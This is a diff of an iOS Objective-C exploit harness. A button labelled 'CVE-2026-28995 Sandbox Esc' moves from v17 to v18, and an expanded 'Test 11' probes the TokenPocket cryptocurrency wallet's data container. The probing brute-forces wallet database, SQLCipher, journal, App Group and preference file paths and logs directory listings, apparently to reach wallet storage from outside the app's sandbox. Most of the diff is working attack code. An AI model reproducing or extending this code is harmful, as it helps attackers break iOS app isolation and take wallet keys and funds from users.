@@ -663,7 +663,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *sbConf = [UIButtonConfiguration filledButtonConfiguration];
     sbConf.baseBackgroundColor = [UIColor systemTealColor];
     self.sandboxEscapeButton.configuration = sbConf;
-    [self.sandboxEscapeButton setTitle:@"CVE-2026-28995 Sandbox Esc v17" forState:UIControlStateNormal];
+    [self.sandboxEscapeButton setTitle:@"CVE-2026-28995 Sandbox Esc v18" forState:UIControlStateNormal];
     [self.sandboxEscapeButton addTarget:self action:@selector(sandboxEscapeTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.sandboxEscapeButton];
 
@@ -7376,94 +7376,148 @@ static void *iohid_threadCopyEvent(void *arg) {
         [log appendFormat:@"  ProductBuildVersion: %@\n", sv[@"ProductBuildVersion"]];
     }
 
-    // Test 11: Read TokenPocket data container
-    [log appendString:@"\n--- Test 11: TokenPocket container read ---\n"];
+    // Test 11: Read TokenPocket data container (v18)
+    [log appendString:@"\n--- Test 11: TokenPocket container read (v18) ---\n"];
     NSString *tpUUID = @"0D926318-FE07-4B1D-8A4B-5278C4E380D5";
     NSString *tpBase = [NSString stringWithFormat:
         @"var/mobile/Containers/Data/Application/%@", tpUUID];
 
-    // === v17: Step 1 — Verify directory structure ===
+    // === v18 Step 1: Verify directory structure ===
     [log appendString:@"\n  [Step 1] Directory check:\n"];
     for (NSString *f in @[
-        @"Documents/",
-        @"Documents/db/",
-        @"Library/",
-        @"Library/Application Support/",
-        @"Library/Caches/",
-        @"../",
-    ]) {
-        probeFile([tpBase stringByAppendingPathComponent:f], log);
-    }
+        @"Documents/", @"Documents/db/", @"Library/",
+        @"Library/Application Support/", @"Library/Caches/", @"../",
+    ]) { probeFile([tpBase stringByAppendingPathComponent:f], log); }
 
-    // === v17: Step 2 — DB files INSIDE Documents/db/ (v16 found this dir exists!) ===
+    // === v18 Step 2: DB files in Documents/db/ (84 combos + new names) ===
     [log appendString:@"\n  [Step 2] DB files in Documents/db/:\n"];
-    NSArray *v17dbNames = @[
-        @"wallet", @"tokenpocket", @"tp", @"data", @"global_wallet",
-        @"tp_wallet", @"tpwallet", @"keypal", @"keypal_wallet", @"keypal2",
-        @"hd_wallet", @"hdwallet", @"wallet_db", @"tp_db", @"tron_wallet",
-        @"globalwallet", @"global_wallet_db", @"keypal_db",
-        @"KeyPalWalletDB", @"HDWalletDB", @"WalletDB",
+    NSArray *v18dbNames = @[
+        @"wallet",@"tokenpocket",@"tp",@"data",@"global_wallet",
+        @"tp_wallet",@"tpwallet",@"keypal",@"keypal_wallet",@"keypal2",
+        @"hd_wallet",@"hdwallet",@"wallet_db",@"tp_db",@"tron_wallet",
+        @"globalwallet",@"global_wallet_db",@"keypal_db",
+        @"KeyPalWalletDB",@"HDWalletDB",@"WalletDB",
+        // v18 additions:
+        @"Global_Wallet",@"globalwallet_db",@"com.global.wallet.ios",
+        @"storage",@"app_data",@"local_data",@"encrypted",
+        @"wallet_data",@"wallet_v2",@"default",@"main",@"app",
+        @"cache",@"token",@"tokens",@"eth_wallet",@"btc_wallet",
+        @"tron",@"eos",@"bsc",
     ];
-    NSArray *v17dbExts = @[@".db", @".sqlite", @".sqlite3", @""];
-    for (NSString *name in v17dbNames) {
-        for (NSString *ext in v17dbExts) {
+    NSArray *v18dbExts = @[@".db",@".sqlite",@".sqlite3",@".encrypted",@".sqlcipher",@".dat",@""];
+    for (NSString *name in v18dbNames) {
+        for (NSString *ext in v18dbExts) {
             probeFile([tpBase stringByAppendingPathComponent:
                 [NSString stringWithFormat:@"Documents/db/%@%@", name, ext]], log);
         }
     }
 
-    // === v17: Step 3 — SQLite WAL/SHM companion files ===
-    [log appendString:@"\n  [Step 3] SQLite WAL/SHM files in Documents/db/:\n"];
-    for (NSString *name in v17dbNames) {
-        for (NSString *suffix in @[@".db-wal", @".sqlite-wal", @".sqlite3-wal",
-                                     @".db-shm", @".sqlite-shm", @".sqlite3-shm"]) {
+    // === v18 Step 3: WAL/SHM + SQLCipher journal files ===
+    [log appendString:@"\n  [Step 3] Companion files in Documents/db/:\n"];
+    for (NSString *name in v18dbNames) {
+        for (NSString *suffix in @[@".db-wal",@".sqlite-wal",@".sqlite3-wal",
+                                     @".db-shm",@".sqlite-shm",@".sqlite3-shm",
+                                     @".db-journal",@".sqlite-journal"]) {
             probeFile([tpBase stringByAppendingPathComponent:
                 [NSString stringWithFormat:@"Documents/db/%@%@", name, suffix]], log);
         }
     }
 
-    // === v17: Step 4 — Other files in Documents/db/ ===
+    // === v18 Step 4: Other files in Documents/db/ ===
     [log appendString:@"\n  [Step 4] Other files in Documents/db/:\n"];
     for (NSString *f in @[
-        @"Documents/db/manifest.json",
-        @"Documents/db/schema.sql",
-        @"Documents/db/database.json",
-        @"Documents/db/keystore",
-        @"Documents/db/keypal",
-        @"Documents/db/tron",
-        @"Documents/db/eth",
-        @"Documents/db/btc",
-    ]) {
-        probeFile([tpBase stringByAppendingPathComponent:f], log);
-    }
+        @"Documents/db/manifest.json",@"Documents/db/schema.sql",
+        @"Documents/db/database.json",@"Documents/db/keystore",
+        @"Documents/db/keypal",@"Documents/db/tron",@"Documents/db/eth",
+        @"Documents/db/btc",@"Documents/db/sol",@"Documents/db/bsc",
+    ]) { probeFile([tpBase stringByAppendingPathComponent:f], log); }
 
-    // === v17: Step 5 — Shared/AppGroup probe ===
+    // === v18 Step 5: Shared/AppGroup containers ===
     [log appendString:@"\n  [Step 5] Shared/AppGroup:\n"];
     probeFile(@"var/mobile/Containers/Shared/AppGroup/", log);
+    // Known TokenPocket App Group IDs from binary
+    for (NSString *grpId in @[
+        @"group.com.tpwallet.wc",
+        @"group.com.tp.wallet.wc",
+        @"group.shared.tpwallet.internal",
+    ]) {
+        NSString *grpBase = [NSString stringWithFormat:@"var/mobile/Containers/Shared/AppGroup/%@", grpId];
+        probeFile(grpBase, log);
+        for (NSString *sub in @[@"Documents/",@"Library/",@"Database/"]) {
+            probeFile([grpBase stringByAppendingPathComponent:sub], log);
+        }
+        // Also look for DB files in App Group root
+        for (NSString *name in @[@"wallet",@"tp",@"data",@"storage",@"shared"]) {
+            for (NSString *ext in @[@".db",@".sqlite",@".sqlite3"]) {
+                probeFile([grpBase stringByAppendingPathComponent:
+                    [NSString stringWithFormat:@"%@%@", name, ext]], log);
+            }
+        }
+    }
 
-    // === v17: Step 6 — Try listing TP Preferences and Documents/db/ ===
+    // === v18 Step 6: Directory listings (will likely fail due to sandbox) ===
     [log appendString:@"\n  [Step 6] Directory listings:\n"];
-    // Try Documents/db/
-    NSString *v17dbPath = TRYFILE([tpBase stringByAppendingPathComponent:@"Documents/db/"]);
-    NSArray *v17dbList = [fm contentsOfDirectoryAtPath:v17dbPath error:nil];
-    [log appendFormat:@"  Documents/db/ listing: %lu entries\n", (unsigned long)v17dbList.count];
-    for (NSString *e in v17dbList) {
-        [log appendFormat:@"    %@\n", e];
+    for (NSString *sub in @[@"Documents/db/",@"Library/Preferences/",@"Library/Application Support/"]) {
+        NSString *p = TRYFILE([tpBase stringByAppendingPathComponent:sub]);
+        NSArray *listing = [fm contentsOfDirectoryAtPath:p error:nil];
+        [log appendFormat:@"  %@ listing: %lu entries\n", sub, (unsigned long)listing.count];
+        for (NSString *e in listing) { [log appendFormat:@"    %@\n", e]; }
     }
-    // Try Preferences/
-    NSString *v17prefsPath = TRYFILE([tpBase stringByAppendingPathComponent:@"Library/Preferences/"]);
-    NSArray *v17prefsList = [fm contentsOfDirectoryAtPath:v17prefsPath error:nil];
-    [log appendFormat:@"  Preferences/ listing: %lu entries\n", (unsigned long)v17prefsList.count];
-    for (NSString *e in v17prefsList) {
-        [log appendFormat:@"    %@\n", e];
+
+    // === v18 Step 7 (NEW): Read TP Preferences plist — may contain DB config ===
+    [log appendString:@"\n  [Step 7] TokenPocket Preferences plist:\n"];
+    probeFile([tpBase stringByAppendingPathComponent:
+        @"Library/Preferences/com.global.wallet.ios.plist"], log);
+    // Also try alternate preference file names
+    for (NSString *prefName in @[
+        @"com.global.wallet.ios.plist",
+        @"Global_Wallet.plist",
+        @"group.com.tpwallet.wc.plist",
+        @"group.com.tp.wallet.wc.plist",
+        @"group.shared.tpwallet.internal.plist",
+        @".GlobalPreferences.plist",
+    ]) {
+        probeFile([tpBase stringByAppendingPathComponent:
+            [NSString stringWithFormat:@"Library/Preferences/%@", prefName]], log);
     }
-    // Try Library/Application Support/
-    NSString *v17asPath = TRYFILE([tpBase stringByAppendingPathComponent:@"Library/Application Support/"]);
-    NSArray *v17asList = [fm contentsOfDirectoryAtPath:v17asPath error:nil];
-    [log appendFormat:@"  Application Support/ listing: %lu entries\n", (unsigned long)v17asList.count];
-    for (NSString *e in v17asList) {
-        [log appendFormat:@"    %@\n", e];
+
+    // === v18 Step 8 (NEW): Container metadata plist ===
+    [log appendString:@"\n  [Step 8] Container metadata:\n"];
+    probeFile([tpBase stringByAppendingPathComponent:
+        @".com.apple.mobile_container_manager.metadata.plist"], log);
+
+    // === v18 Step 9 (NEW): UUID-named DB files ===
+    // Binary references UUIDString — DB may be named with a UUID
+    [log appendString:@"\n  [Step 9] UUID-named DB in Documents/db/:\n"];
+    // The container UUID itself might be used as DB name
+    probeFile([tpBase stringByAppendingPathComponent:
+        [NSString stringWithFormat:@"Documents/db/%@.db", tpUUID]], log);
+    probeFile([tpBase stringByAppendingPathComponent:
+        [NSString stringWithFormat:@"Documents/db/%@.sqlite", tpUUID]], log);
+    // Try short UUID form (first 8 chars)
+    NSString *shortUUID = [tpUUID substringToIndex:8];
+    for (NSString *ext in @[@".db",@".sqlite",@".sqlite3",@""]) {
+        probeFile([tpBase stringByAppendingPathComponent:
+            [NSString stringWithFormat:@"Documents/db/%@%@", shortUUID, ext]], log);
     }
+
+    // === v18 Step 10 (NEW): DB files at root level (just in case) ===
+    [log appendString:@"\n  [Step 10] DB at container root:\n"];
+    for (NSString *name in @[@"wallet",@"tp",@"data",@"storage",@"global_wallet",@"tokenpocket"]) {
+        for (NSString *ext in @[@".db",@".sqlite",@".sqlite3",@".encrypted"]) {
+            probeFile([tpBase stringByAppendingPathComponent:
+                [NSString stringWithFormat:@"Documents/%@%@", name, ext]], log);
+        }
+    }
+
+    // === v18 Step 11 (NEW): Read any .json config files ===
+    [log appendString:@"\n  [Step 11] JSON config files:\n"];
+    for (NSString *f in @[
+        @"Documents/config.json",@"Documents/settings.json",
+        @"Documents/db_config.json",@"Library/config.json",
+        @"Library/Application Support/config.json",
+    ]) { probeFile([tpBase stringByAppendingPathComponent:f], log); }
+
     dispatch_async(dispatch_get_main_queue(), ^{ [self appendLog:log]; });
 }
 
